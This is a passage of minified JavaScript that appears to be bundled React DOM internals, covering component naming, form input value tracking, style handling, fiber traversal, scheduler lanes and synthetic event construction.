      return "Profiler";
    case za:
      return "StrictMode";
    case Ea:
      return "Suspense";
    case Fa:
      return "SuspenseList";
  }
  if (typeof i == "object")
    switch (i.$$typeof) {
      case Ca:
        return (i.displayName || "Context") + ".Consumer";
      case Ba:
        return (i._context.displayName || "Context") + ".Provider";
      case Da:
        var a = i.render;
        return (
          (i = i.displayName),
          i ||
            ((i = a.displayName || a.name || ""),
            (i = i !== "" ? "ForwardRef(" + i + ")" : "ForwardRef")),
          i
        );
      case Ga:
        return (
          (a = i.displayName || null), a !== null ? a : Qa(i.type) || "Memo"
        );
      case Ha:
        (a = i._payload), (i = i._init);
        try {
          return Qa(i(a));
        } catch {}
    }
  return null;
}
function Ra(i) {
  var a = i.type;
  switch (i.tag) {
    case 24:
      return "Cache";
    case 9:
      return (a.displayName || "Context") + ".Consumer";
    case 10:
      return (a._context.displayName || "Context") + ".Provider";
    case 18:
      return "DehydratedFragment";
    case 11:
      return (
        (i = a.render),
        (i = i.displayName || i.name || ""),
        a.displayName || (i !== "" ? "ForwardRef(" + i + ")" : "ForwardRef")
      );
    case 7:
      return "Fragment";
    case 5:
      return a;
    case 4:
      return "Portal";
    case 3:
      return "Root";
    case 6:
      return "Text";
    case 16:
      return Qa(a);
    case 8:
      return a === za ? "StrictMode" : "Mode";
    case 22:
      return "Offscreen";
    case 12:
      return "Profiler";
    case 21:
      return "Scope";
    case 13:
      return "Suspense";
    case 19:
      return "SuspenseList";
    case 25:
      return "TracingMarker";
    case 1:
    case 0:
    case 17:
    case 2:
    case 14:
    case 15:
      if (typeof a == "function") return a.displayName || a.name || null;
      if (typeof a == "string") return a;
  }
  return null;
}
function Sa(i) {
  switch (typeof i) {
    case "boolean":
    case "number":
    case "string":
    case "undefined":
      return i;
    case "object":
      return i;
    default:
      return "";
  }
}
function Ta(i) {
  var a = i.type;
  return (
    (i = i.nodeName) &&
    i.toLowerCase() === "input" &&
    (a === "checkbox" || a === "radio")
  );
}
function Ua(i) {
  var a = Ta(i) ? "checked" : "value",
    o = Object.getOwnPropertyDescriptor(i.constructor.prototype, a),
    s = "" + i[a];
  if (
    !i.hasOwnProperty(a) &&
    typeof o < "u" &&
    typeof o.get == "function" &&
    typeof o.set == "function"
  ) {
    var tt = o.get,
      nt = o.set;
    return (
      Object.defineProperty(i, a, {
        configurable: !0,
        get: function () {
          return tt.call(this);
        },
        set: function (ot) {
          (s = "" + ot), nt.call(this, ot);
        },
      }),
      Object.defineProperty(i, a, { enumerable: o.enumerable }),
      {
        getValue: function () {
          return s;
        },
        setValue: function (ot) {
          s = "" + ot;
        },
        stopTracking: function () {
          (i._valueTracker = null), delete i[a];
        },
      }
    );
  }
}
function Va(i) {
  i._valueTracker || (i._valueTracker = Ua(i));
}
function Wa(i) {
  if (!i) return !1;
  var a = i._valueTracker;
  if (!a) return !0;
  var o = a.getValue(),
    s = "";
  return (
    i && (s = Ta(i) ? (i.checked ? "true" : "false") : i.value),
    (i = s),
    i !== o ? (a.setValue(i), !0) : !1
  );
}
function Xa(i) {
  if (((i = i || (typeof document < "u" ? document : void 0)), typeof i > "u"))
    return null;
  try {
    return i.activeElement || i.body;
  } catch {
    return i.body;
  }
}
function Ya(i, a) {
  var o = a.checked;
  return A$1({}, a, {
    defaultChecked: void 0,
    defaultValue: void 0,
    value: void 0,
    checked: o ?? i._wrapperState.initialChecked,
  });
}
function Za(i, a) {
  var o = a.defaultValue == null ? "" : a.defaultValue,
    s = a.checked != null ? a.checked : a.defaultChecked;
  (o = Sa(a.value != null ? a.value : o)),
    (i._wrapperState = {
      initialChecked: s,
      initialValue: o,
      controlled:
        a.type === "checkbox" || a.type === "radio"
          ? a.checked != null
          : a.value != null,
    });
}
function ab(i, a) {
  (a = a.checked), a != null && ta(i, "checked", a, !1);
}
function bb(i, a) {
  ab(i, a);
  var o = Sa(a.value),
    s = a.type;
  if (o != null)
    s === "number"
      ? ((o === 0 && i.value === "") || i.value != o) && (i.value = "" + o)
      : i.value !== "" + o && (i.value = "" + o);
  else if (s === "submit" || s === "reset") {
    i.removeAttribute("value");
    return;
  }
  a.hasOwnProperty("value")
    ? cb(i, a.type, o)
    : a.hasOwnProperty("defaultValue") && cb(i, a.type, Sa(a.defaultValue)),
    a.checked == null &&
      a.defaultChecked != null &&
      (i.defaultChecked = !!a.defaultChecked);
}
function db(i, a, o) {
  if (a.hasOwnProperty("value") || a.hasOwnProperty("defaultValue")) {
    var s = a.type;
    if (
      !(
        (s !== "submit" && s !== "reset") ||
        (a.value !== void 0 && a.value !== null)
      )
    )
      return;
    (a = "" + i._wrapperState.initialValue),
      o || a === i.value || (i.value = a),
      (i.defaultValue = a);
  }
  (o = i.name),
    o !== "" && (i.name = ""),
    (i.defaultChecked = !!i._wrapperState.initialChecked),
    o !== "" && (i.name = o);
}
function cb(i, a, o) {
  (a !== "number" || Xa(i.ownerDocument) !== i) &&
    (o == null
      ? (i.defaultValue = "" + i._wrapperState.initialValue)
      : i.defaultValue !== "" + o && (i.defaultValue = "" + o));
}
var eb = Array.isArray;
function fb(i, a, o, s) {
  if (((i = i.options), a)) {
    a = {};
    for (var tt = 0; tt < o.length; tt++) a["$" + o[tt]] = !0;
    for (o = 0; o < i.length; o++)
      (tt = a.hasOwnProperty("$" + i[o].value)),
        i[o].selected !== tt && (i[o].selected = tt),
        tt && s && (i[o].defaultSelected = !0);
  } else {
    for (o = "" + Sa(o), a = null, tt = 0; tt < i.length; tt++) {
      if (i[tt].value === o) {
        (i[tt].selected = !0), s && (i[tt].defaultSelected = !0);
        return;
      }
      a !== null || i[tt].disabled || (a = i[tt]);
    }
    a !== null && (a.selected = !0);
  }
}
function gb(i, a) {
  if (a.dangerouslySetInnerHTML != null) throw Error(p$1(91));
  return A$1({}, a, {
    value: void 0,
    defaultValue: void 0,
    children: "" + i._wrapperState.initialValue,
  });
}
function hb(i, a) {
  var o = a.value;
  if (o == null) {
    if (((o = a.children), (a = a.defaultValue), o != null)) {
      if (a != null) throw Error(p$1(92));
      if (eb(o)) {
        if (1 < o.length) throw Error(p$1(93));
        o = o[0];
      }
      a = o;
    }
    a == null && (a = ""), (o = a);
  }
  i._wrapperState = { initialValue: Sa(o) };
}
function ib(i, a) {
  var o = Sa(a.value),
    s = Sa(a.defaultValue);
  o != null &&
    ((o = "" + o),
    o !== i.value && (i.value = o),
    a.defaultValue == null && i.defaultValue !== o && (i.defaultValue = o)),
    s != null && (i.defaultValue = "" + s);
}
function jb(i) {
  var a = i.textContent;
  a === i._wrapperState.initialValue && a !== "" && a !== null && (i.value = a);
}
function kb(i) {
  switch (i) {
    case "svg":
      return "http://www.w3.org/2000/svg";
    case "math":
      return "http://www.w3.org/1998/Math/MathML";
    default:
      return "http://www.w3.org/1999/xhtml";
  }
}
function lb(i, a) {
  return i == null || i === "http://www.w3.org/1999/xhtml"
    ? kb(a)
    : i === "http://www.w3.org/2000/svg" && a === "foreignObject"
    ? "http://www.w3.org/1999/xhtml"
    : i;
}
var mb,
  nb = (function (i) {
    return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction
      ? function (a, o, s, tt) {
          MSApp.execUnsafeLocalFunction(function () {
            return i(a, o, s, tt);
          });
        }
      : i;
  })(function (i, a) {
    if (i.namespaceURI !== "http://www.w3.org/2000/svg" || "innerHTML" in i)
      i.innerHTML = a;
    else {
      for (
        mb = mb || document.createElement("div"),
          mb.innerHTML = "<svg>" + a.valueOf().toString() + "</svg>",
          a = mb.firstChild;
        i.firstChild;

      )
        i.removeChild(i.firstChild);
      for (; a.firstChild; ) i.appendChild(a.firstChild);
    }
  });
function ob(i, a) {
  if (a) {
    var o = i.firstChild;
    if (o && o === i.lastChild && o.nodeType === 3) {
      o.nodeValue = a;
      return;
    }
  }
  i.textContent = a;
}
var pb = {
    animationIterationCount: !0,
    aspectRatio: !0,
    borderImageOutset: !0,
    borderImageSlice: !0,
    borderImageWidth: !0,
    boxFlex: !0,
    boxFlexGroup: !0,
    boxOrdinalGroup: !0,
    columnCount: !0,
    columns: !0,
    flex: !0,
    flexGrow: !0,
    flexPositive: !0,
    flexShrink: !0,
    flexNegative: !0,
    flexOrder: !0,
    gridArea: !0,
    gridRow: !0,
    gridRowEnd: !0,
    gridRowSpan: !0,
    gridRowStart: !0,
    gridColumn: !0,
    gridColumnEnd: !0,
    gridColumnSpan: !0,
    gridColumnStart: !0,
    fontWeight: !0,
    lineClamp: !0,
    lineHeight: !0,
    opacity: !0,
    order: !0,
    orphans: !0,
    tabSize: !0,
    widows: !0,
    zIndex: !0,
    zoom: !0,
    fillOpacity: !0,
    floodOpacity: !0,
    stopOpacity: !0,
    strokeDasharray: !0,
    strokeDashoffset: !0,
    strokeMiterlimit: !0,
    strokeOpacity: !0,
    strokeWidth: !0,
  },
  qb = ["Webkit", "ms", "Moz", "O"];
Object.keys(pb).forEach(function (i) {
  qb.forEach(function (a) {
    (a = a + i.charAt(0).toUpperCase() + i.substring(1)), (pb[a] = pb[i]);
  });
});
function rb(i, a, o) {
  return a == null || typeof a == "boolean" || a === ""
    ? ""
    : o || typeof a != "number" || a === 0 || (pb.hasOwnProperty(i) && pb[i])
    ? ("" + a).trim()
    : a + "px";
}
function sb(i, a) {
  i = i.style;
  for (var o in a)
    if (a.hasOwnProperty(o)) {
      var s = o.indexOf("--") === 0,
        tt = rb(o, a[o], s);
      o === "float" && (o = "cssFloat"), s ? i.setProperty(o, tt) : (i[o] = tt);
    }
}
var tb = A$1(
  { menuitem: !0 },
  {
    area: !0,
    base: !0,
    br: !0,
    col: !0,
    embed: !0,
    hr: !0,
    img: !0,
    input: !0,
    keygen: !0,
    link: !0,
    meta: !0,
    param: !0,
    source: !0,
    track: !0,
    wbr: !0,
  }
);
function ub(i, a) {
  if (a) {
    if (tb[i] && (a.children != null || a.dangerouslySetInnerHTML != null))
      throw Error(p$1(137, i));
    if (a.dangerouslySetInnerHTML != null) {
      if (a.children != null) throw Error(p$1(60));
      if (
        typeof a.dangerouslySetInnerHTML != "object" ||
        !("__html" in a.dangerouslySetInnerHTML)
      )
        throw Error(p$1(61));
    }
    if (a.style != null && typeof a.style != "object") throw Error(p$1(62));
  }
}
function vb(i, a) {
  if (i.indexOf("-") === -1) return typeof a.is == "string";
  switch (i) {
    case "annotation-xml":
    case "color-profile":
    case "font-face":
    case "font-face-src":
    case "font-face-uri":
    case "font-face-format":
    case "font-face-name":
    case "missing-glyph":
      return !1;
    default:
      return !0;
  }
}
var wb = null;
function xb(i) {
  return (
    (i = i.target || i.srcElement || window),
    i.correspondingUseElement && (i = i.correspondingUseElement),
    i.nodeType === 3 ? i.parentNode : i
  );
}
var yb = null,
  zb = null,
  Ab = null;
function Bb(i) {
  if ((i = Cb(i))) {
    if (typeof yb != "function") throw Error(p$1(280));
    var a = i.stateNode;
    a && ((a = Db(a)), yb(i.stateNode, i.type, a));
  }
}
function Eb(i) {
  zb ? (Ab ? Ab.push(i) : (Ab = [i])) : (zb = i);
}
function Fb() {
  if (zb) {
    var i = zb,
      a = Ab;
    if (((Ab = zb = null), Bb(i), a)) for (i = 0; i < a.length; i++) Bb(a[i]);
  }
}
function Gb(i, a) {
  return i(a);
}
function Hb() {}
var Ib = !1;
function Jb(i, a, o) {
  if (Ib) return i(a, o);
  Ib = !0;
  try {
    return Gb(i, a, o);
  } finally {
    (Ib = !1), (zb !== null || Ab !== null) && (Hb(), Fb());
  }
}
function Kb(i, a) {
  var o = i.stateNode;
  if (o === null) return null;
  var s = Db(o);
  if (s === null) return null;
  o = s[a];
  e: switch (a) {
    case "onClick":
    case "onClickCapture":
    case "onDoubleClick":
    case "onDoubleClickCapture":
    case "onMouseDown":
    case "onMouseDownCapture":
    case "onMouseMove":
    case "onMouseMoveCapture":
    case "onMouseUp":
    case "onMouseUpCapture":
    case "onMouseEnter":
      (s = !s.disabled) ||
        ((i = i.type),
        (s = !(
          i === "button" ||
          i === "input" ||
          i === "select" ||
          i === "textarea"
        ))),
        (i = !s);
      break e;
    default:
      i = !1;
  }
  if (i) return null;
  if (o && typeof o != "function") throw Error(p$1(231, a, typeof o));
  return o;
}
var Lb = !1;
if (ia)
  try {
    var Mb = {};
    Object.defineProperty(Mb, "passive", {
      get: function () {
        Lb = !0;
      },
    }),
      window.addEventListener("test", Mb, Mb),
      window.removeEventListener("test", Mb, Mb);
  } catch {
    Lb = !1;
  }
function Nb(i, a, o, s, tt, nt, ot, st, ft) {
  var ht = Array.prototype.slice.call(arguments, 3);
  try {
    a.apply(o, ht);
  } catch (gt) {
    this.onError(gt);
  }
}
var Ob = !1,
  Pb = null,
  Qb = !1,
  Rb = null,
  Sb = {
    onError: function (i) {
      (Ob = !0), (Pb = i);
    },
  };
function Tb(i, a, o, s, tt, nt, ot, st, ft) {
  (Ob = !1), (Pb = null), Nb.apply(Sb, arguments);
}
function Ub(i, a, o, s, tt, nt, ot, st, ft) {
  if ((Tb.apply(this, arguments), Ob)) {
    if (Ob) {
      var ht = Pb;
      (Ob = !1), (Pb = null);
    } else throw Error(p$1(198));
    Qb || ((Qb = !0), (Rb = ht));
  }
}
function Vb(i) {
  var a = i,
    o = i;
  if (i.alternate) for (; a.return; ) a = a.return;
  else {
    i = a;
    do (a = i), a.flags & 4098 && (o = a.return), (i = a.return);
    while (i);
  }
  return a.tag === 3 ? o : null;
}
function Wb(i) {
  if (i.tag === 13) {
    var a = i.memoizedState;
    if (
      (a === null && ((i = i.alternate), i !== null && (a = i.memoizedState)),
      a !== null)
    )
      return a.dehydrated;
  }
  return null;
}
function Xb(i) {
  if (Vb(i) !== i) throw Error(p$1(188));
}
function Yb(i) {
  var a = i.alternate;
  if (!a) {
    if (((a = Vb(i)), a === null)) throw Error(p$1(188));
    return a !== i ? null : i;
  }
  for (var o = i, s = a; ; ) {
    var tt = o.return;
    if (tt === null) break;
    var nt = tt.alternate;
    if (nt === null) {
      if (((s = tt.return), s !== null)) {
        o = s;
        continue;
      }
      break;
    }
    if (tt.child === nt.child) {
      for (nt = tt.child; nt; ) {
        if (nt === o) return Xb(tt), i;
        if (nt === s) return Xb(tt), a;
        nt = nt.sibling;
      }
      throw Error(p$1(188));
    }
    if (o.return !== s.return) (o = tt), (s = nt);
    else {
      for (var ot = !1, st = tt.child; st; ) {
        if (st === o) {
          (ot = !0), (o = tt), (s = nt);
          break;
        }
        if (st === s) {
          (ot = !0), (s = tt), (o = nt);
          break;
        }
        st = st.sibling;
      }
      if (!ot) {
        for (st = nt.child; st; ) {
          if (st === o) {
            (ot = !0), (o = nt), (s = tt);
            break;
          }
          if (st === s) {
            (ot = !0), (s = nt), (o = tt);
            break;
          }
          st = st.sibling;
        }
        if (!ot) throw Error(p$1(189));
      }
    }
    if (o.alternate !== s) throw Error(p$1(190));
  }
  if (o.tag !== 3) throw Error(p$1(188));
  return o.stateNode.current === o ? i : a;
}
function Zb(i) {
  return (i = Yb(i)), i !== null ? $b(i) : null;
}
function $b(i) {
  if (i.tag === 5 || i.tag === 6) return i;
  for (i = i.child; i !== null; ) {
    var a = $b(i);
    if (a !== null) return a;
    i = i.sibling;
  }
  return null;
}
var ac = ca.unstable_scheduleCallback,
  bc = ca.unstable_cancelCallback,
  cc = ca.unstable_shouldYield,
  dc = ca.unstable_requestPaint,
  B$1 = ca.unstable_now,
  ec = ca.unstable_getCurrentPriorityLevel,
  fc = ca.unstable_ImmediatePriority,
  gc = ca.unstable_UserBlockingPriority,
  hc = ca.unstable_NormalPriority,
  ic = ca.unstable_LowPriority,
  jc = ca.unstable_IdlePriority,
  kc = null,
  lc = null;
function mc(i) {
  if (lc && typeof lc.onCommitFiberRoot == "function")
    try {
      lc.onCommitFiberRoot(kc, i, void 0, (i.current.flags & 128) === 128);
    } catch {}
}
var oc = Math.clz32 ? Math.clz32 : nc,
  pc = Math.log,
  qc = Math.LN2;
function nc(i) {
  return (i >>>= 0), i === 0 ? 32 : (31 - ((pc(i) / qc) | 0)) | 0;
}
var rc = 64,
  sc = 4194304;
function tc(i) {
  switch (i & -i) {
    case 1:
      return 1;
    case 2:
      return 2;
    case 4:
      return 4;
    case 8:
      return 8;
    case 16:
      return 16;
    case 32:
      return 32;
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
      return i & 4194240;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
      return i & 130023424;
    case 134217728:
      return 134217728;
    case 268435456:
      return 268435456;
    case 536870912:
      return 536870912;
    case 1073741824:
      return 1073741824;
    default:
      return i;
  }
}
function uc(i, a) {
  var o = i.pendingLanes;
  if (o === 0) return 0;
  var s = 0,
    tt = i.suspendedLanes,
    nt = i.pingedLanes,
    ot = o & 268435455;
  if (ot !== 0) {
    var st = ot & ~tt;
    st !== 0 ? (s = tc(st)) : ((nt &= ot), nt !== 0 && (s = tc(nt)));
  } else (ot = o & ~tt), ot !== 0 ? (s = tc(ot)) : nt !== 0 && (s = tc(nt));
  if (s === 0) return 0;
  if (
    a !== 0 &&
    a !== s &&
    !(a & tt) &&
    ((tt = s & -s),
    (nt = a & -a),
    tt >= nt || (tt === 16 && (nt & 4194240) !== 0))
  )
    return a;
  if ((s & 4 && (s |= o & 16), (a = i.entangledLanes), a !== 0))
    for (i = i.entanglements, a &= s; 0 < a; )
      (o = 31 - oc(a)), (tt = 1 << o), (s |= i[o]), (a &= ~tt);
  return s;
}
function vc(i, a) {
  switch (i) {
    case 1:
    case 2:
    case 4:
      return a + 250;
    case 8:
    case 16:
    case 32:
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
      return a + 5e3;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
      return -1;
    case 134217728:
    case 268435456:
    case 536870912:
    case 1073741824:
      return -1;
    default:
      return -1;
  }
}
function wc(i, a) {
  for (
    var o = i.suspendedLanes,
      s = i.pingedLanes,
      tt = i.expirationTimes,
      nt = i.pendingLanes;
    0 < nt;

  ) {
    var ot = 31 - oc(nt),
      st = 1 << ot,
      ft = tt[ot];
    ft === -1
      ? (!(st & o) || st & s) && (tt[ot] = vc(st, a))
      : ft <= a && (i.expiredLanes |= st),
      (nt &= ~st);
  }
}
function xc(i) {
  return (
    (i = i.pendingLanes & -1073741825),
    i !== 0 ? i : i & 1073741824 ? 1073741824 : 0
  );
}
function yc() {
  var i = rc;
  return (rc <<= 1), !(rc & 4194240) && (rc = 64), i;
}
function zc(i) {
  for (var a = [], o = 0; 31 > o; o++) a.push(i);
  return a;
}
function Ac(i, a, o) {
  (i.pendingLanes |= a),
    a !== 536870912 && ((i.suspendedLanes = 0), (i.pingedLanes = 0)),
    (i = i.eventTimes),
    (a = 31 - oc(a)),
    (i[a] = o);
}
function Bc(i, a) {
  var o = i.pendingLanes & ~a;
  (i.pendingLanes = a),
    (i.suspendedLanes = 0),
    (i.pingedLanes = 0),
    (i.expiredLanes &= a),
    (i.mutableReadLanes &= a),
    (i.entangledLanes &= a),
    (a = i.entanglements);
  var s = i.eventTimes;
  for (i = i.expirationTimes; 0 < o; ) {
    var tt = 31 - oc(o),
      nt = 1 << tt;
    (a[tt] = 0), (s[tt] = -1), (i[tt] = -1), (o &= ~nt);
  }
}
function Cc(i, a) {
  var o = (i.entangledLanes |= a);
  for (i = i.entanglements; o; ) {
    var s = 31 - oc(o),
      tt = 1 << s;
    (tt & a) | (i[s] & a) && (i[s] |= a), (o &= ~tt);
  }
}
var C$1 = 0;
function Dc(i) {
  return (i &= -i), 1 < i ? (4 < i ? (i & 268435455 ? 16 : 536870912) : 4) : 1;
}
var Ec,
  Fc,
  Gc,
  Hc,
  Ic,
  Jc = !1,
  Kc = [],
  Lc = null,
  Mc = null,
  Nc = null,
  Oc = new Map(),
  Pc = new Map(),
  Qc = [],
  Rc =
    "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(
      " "
    );
function Sc(i, a) {
  switch (i) {
    case "focusin":
    case "focusout":
      Lc = null;
      break;
    case "dragenter":
    case "dragleave":
      Mc = null;
      break;
    case "mouseover":
    case "mouseout":
      Nc = null;
      break;
    case "pointerover":
    case "pointerout":
      Oc.delete(a.pointerId);
      break;
    case "gotpointercapture":
    case "lostpointercapture":
      Pc.delete(a.pointerId);
  }
}
function Tc(i, a, o, s, tt, nt) {
  return i === null || i.nativeEvent !== nt
    ? ((i = {
        blockedOn: a,
        domEventName: o,
        eventSystemFlags: s,
        nativeEvent: nt,
        targetContainers: [tt],
      }),
      a !== null && ((a = Cb(a)), a !== null && Fc(a)),
      i)
    : ((i.eventSystemFlags |= s),
      (a = i.targetContainers),
      tt !== null && a.indexOf(tt) === -1 && a.push(tt),
      i);
}
function Uc(i, a, o, s, tt) {
  switch (a) {
    case "focusin":
      return (Lc = Tc(Lc, i, a, o, s, tt)), !0;
    case "dragenter":
      return (Mc = Tc(Mc, i, a, o, s, tt)), !0;
    case "mouseover":
      return (Nc = Tc(Nc, i, a, o, s, tt)), !0;
    case "pointerover":
      var nt = tt.pointerId;
      return Oc.set(nt, Tc(Oc.get(nt) || null, i, a, o, s, tt)), !0;
    case "gotpointercapture":
      return (
        (nt = tt.pointerId),
        Pc.set(nt, Tc(Pc.get(nt) || null, i, a, o, s, tt)),
        !0
      );
  }
  return !1;
}
function Vc(i) {
  var a = Wc(i.target);
  if (a !== null) {
    var o = Vb(a);
    if (o !== null) {
      if (((a = o.tag), a === 13)) {
        if (((a = Wb(o)), a !== null)) {
          (i.blockedOn = a),
            Ic(i.priority, function () {
              Gc(o);
            });
          return;
        }
      } else if (a === 3 && o.stateNode.current.memoizedState.isDehydrated) {
        i.blockedOn = o.tag === 3 ? o.stateNode.containerInfo : null;
        return;
      }
    }
  }
  i.blockedOn = null;
}
function Xc(i) {
  if (i.blockedOn !== null) return !1;
  for (var a = i.targetContainers; 0 < a.length; ) {
    var o = Yc(i.domEventName, i.eventSystemFlags, a[0], i.nativeEvent);
    if (o === null) {
      o = i.nativeEvent;
      var s = new o.constructor(o.type, o);
      (wb = s), o.target.dispatchEvent(s), (wb = null);
    } else return (a = Cb(o)), a !== null && Fc(a), (i.blockedOn = o), !1;
    a.shift();
  }
  return !0;
}
function Zc(i, a, o) {
  Xc(i) && o.delete(a);
}
function $c() {
  (Jc = !1),
    Lc !== null && Xc(Lc) && (Lc = null),
    Mc !== null && Xc(Mc) && (Mc = null),
    Nc !== null && Xc(Nc) && (Nc = null),
    Oc.forEach(Zc),
    Pc.forEach(Zc);
}
function ad(i, a) {
  i.blockedOn === a &&
    ((i.blockedOn = null),
    Jc ||
      ((Jc = !0),
      ca.unstable_scheduleCallback(ca.unstable_NormalPriority, $c)));
}
function bd(i) {
  function a(tt) {
    return ad(tt, i);
  }
  if (0 < Kc.length) {
    ad(Kc[0], i);
    for (var o = 1; o < Kc.length; o++) {
      var s = Kc[o];
      s.blockedOn === i && (s.blockedOn = null);
    }
  }
  for (
    Lc !== null && ad(Lc, i),
      Mc !== null && ad(Mc, i),
      Nc !== null && ad(Nc, i),
      Oc.forEach(a),
      Pc.forEach(a),
      o = 0;
    o < Qc.length;
    o++
  )
    (s = Qc[o]), s.blockedOn === i && (s.blockedOn = null);
  for (; 0 < Qc.length && ((o = Qc[0]), o.blockedOn === null); )
    Vc(o), o.blockedOn === null && Qc.shift();
}
var cd = ua.ReactCurrentBatchConfig,
  dd = !0;
function ed(i, a, o, s) {
  var tt = C$1,
    nt = cd.transition;
  cd.transition = null;
  try {
    (C$1 = 1), fd(i, a, o, s);
  } finally {
    (C$1 = tt), (cd.transition = nt);
  }
}
function gd(i, a, o, s) {
  var tt = C$1,
    nt = cd.transition;
  cd.transition = null;
  try {
    (C$1 = 4), fd(i, a, o, s);
  } finally {
    (C$1 = tt), (cd.transition = nt);
  }
}
function fd(i, a, o, s) {
  if (dd) {
    var tt = Yc(i, a, o, s);
    if (tt === null) hd(i, a, s, id, o), Sc(i, s);
    else if (Uc(tt, i, a, o, s)) s.stopPropagation();
    else if ((Sc(i, s), a & 4 && -1 < Rc.indexOf(i))) {
      for (; tt !== null; ) {
        var nt = Cb(tt);
        if (
          (nt !== null && Ec(nt),
          (nt = Yc(i, a, o, s)),
          nt === null && hd(i, a, s, id, o),
          nt === tt)
        )
          break;
        tt = nt;
      }
      tt !== null && s.stopPropagation();
    } else hd(i, a, s, null, o);
  }
}
var id = null;
function Yc(i, a, o, s) {
  if (((id = null), (i = xb(s)), (i = Wc(i)), i !== null))
    if (((a = Vb(i)), a === null)) i = null;
    else if (((o = a.tag), o === 13)) {
      if (((i = Wb(a)), i !== null)) return i;
      i = null;
    } else if (o === 3) {
      if (a.stateNode.current.memoizedState.isDehydrated)
        return a.tag === 3 ? a.stateNode.containerInfo : null;
      i = null;
    } else a !== i && (i = null);
  return (id = i), null;
}
function jd(i) {
  switch (i) {
    case "cancel":
    case "click":
    case "close":
    case "contextmenu":
    case "copy":
    case "cut":
    case "auxclick":
    case "dblclick":
    case "dragend":
    case "dragstart":
    case "drop":
    case "focusin":
    case "focusout":
    case "input":
    case "invalid":
    case "keydown":
    case "keypress":
    case "keyup":
    case "mousedown":
    case "mouseup":
    case "paste":
    case "pause":
    case "play":
    case "pointercancel":
    case "pointerdown":
    case "pointerup":
    case "ratechange":
    case "reset":
    case "resize":
    case "seeked":
    case "submit":
    case "touchcancel":
    case "touchend":
    case "touchstart":
    case "volumechange":
    case "change":
    case "selectionchange":
    case "textInput":
    case "compositionstart":
    case "compositionend":
    case "compositionupdate":
    case "beforeblur":
    case "afterblur":
    case "beforeinput":
    case "blur":
    case "fullscreenchange":
    case "focus":
    case "hashchange":
    case "popstate":
    case "select":
    case "selectstart":
      return 1;
    case "drag":
    case "dragenter":
    case "dragexit":
    case "dragleave":
    case "dragover":
    case "mousemove":
    case "mouseout":
    case "mouseover":
    case "pointermove":
    case "pointerout":
    case "pointerover":
    case "scroll":
    case "toggle":
    case "touchmove":
    case "wheel":
    case "mouseenter":
    case "mouseleave":
    case "pointerenter":
    case "pointerleave":
      return 4;
    case "message":
      switch (ec()) {
        case fc:
          return 1;
        case gc:
          return 4;
        case hc:
        case ic:
          return 16;
        case jc:
          return 536870912;
        default:
          return 16;
      }
    default:
      return 16;
  }
}
var kd = null,
  ld = null,
  md = null;
function nd() {
  if (md) return md;
  var i,
    a = ld,
    o = a.length,
    s,
    tt = "value" in kd ? kd.value : kd.textContent,
    nt = tt.length;
  for (i = 0; i < o && a[i] === tt[i]; i++);
  var ot = o - i;
  for (s = 1; s <= ot && a[o - s] === tt[nt - s]; s++);
  return (md = tt.slice(i, 1 < s ? 1 - s : void 0));
}
function od(i) {
  var a = i.keyCode;
  return (
    "charCode" in i
      ? ((i = i.charCode), i === 0 && a === 13 && (i = 13))
      : (i = a),
    i === 10 && (i = 13),
    32 <= i || i === 13 ? i : 0
  );
}
function pd() {
  return !0;
}
function qd() {
  return !1;
}
function rd(i) {
  function a(o, s, tt, nt, ot) {
    (this._reactName = o),
      (this._targetInst = tt),
      (this.type = s),
      (this.nativeEvent = nt),
      (this.target = ot),
      (this.currentTarget = null);
    for (var st in i)
      i.hasOwnProperty(st) && ((o = i[st]), (this[st] = o ? o(nt) : nt[st]));
    return (
      (this.isDefaultPrevented = (
        nt.defaultPrevented != null
          ? nt.defaultPrevented
          : nt.returnValue === !1
      )
        ? pd
        : qd),
      (this.isPropagationStopped = qd),
      this
    );
  }
  return (
    A$1(a.prototype, {
      preventDefault: function () {
        this.defaultPrevented = !0;
        var o = this.nativeEvent;
        o &&
          (o.preventDefault
            ? o.preventDefault()
            : typeof o.returnValue != "unknown" && (o.returnValue = !1),
          (this.isDefaultPrevented = pd));
      },
      stopPropagation: function () {
        var o = this.nativeEvent;
        o &&
          (o.stopPropagation
            ? o.stopPropagation()
            : typeof o.cancelBubble != "unknown" && (o.cancelBubble = !0),
          (this.isPropagationStopped = pd));
      },
      persist: function () {},
      isPersistent: pd,
    }),
    a
  );
}
var sd = {
    eventPhase: 0,
    bubbles: 0,
    cancelable: 0,
    timeStamp: function (i) {
      return i.timeStamp || Date.now();
    },
    defaultPrevented: 0,
    isTrusted: 0,
  },
  td = rd(sd),
  ud = A$1({}, sd, { view: 0, detail: 0 }),
  vd = rd(ud),
  wd,
  xd,
  yd,
  Ad = A$1({}, ud, {
    screenX: 0,
    screenY: 0,
    clientX: 0,
    clientY: 0,
    pageX: 0,
    pageY: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    getModifierState: zd,
    button: 0,
    buttons: 0,
    relatedTarget: function (i) {
      return i.relatedTarget === void 0
        ? i.fromElement === i.srcElement
          ? i.toElement
          : i.fromElement
        : i.relatedTarget;
    },
    movementX: function (i) {
      return "movementX" in i
        ? i.movementX
        : (i !== yd &&
            (yd && i.type === "mousemove"
              ? ((wd = i.screenX - yd.screenX), (xd = i.screenY - yd.screenY))
              : (xd = wd = 0),
            (yd = i)),
          wd);
    },
    movementY: function (i) {
      return "movementY" in i ? i.movementY : xd;
    },
  }),
  Bd = rd(Ad),
  Cd = A$1({}, Ad, { dataTransfer: 0 }),
  Dd = rd(Cd),
  Ed = A$1({}, ud, { relatedTarget: 0 }),
  Fd = rd(Ed),
  Gd = A$1({}, sd, { animationName: 0, elapsedTime: 0, pseudoElement: 0 }),
  Hd = rd(Gd),
  Id = A$1({}, sd, {
    clipboardData: function (i) {
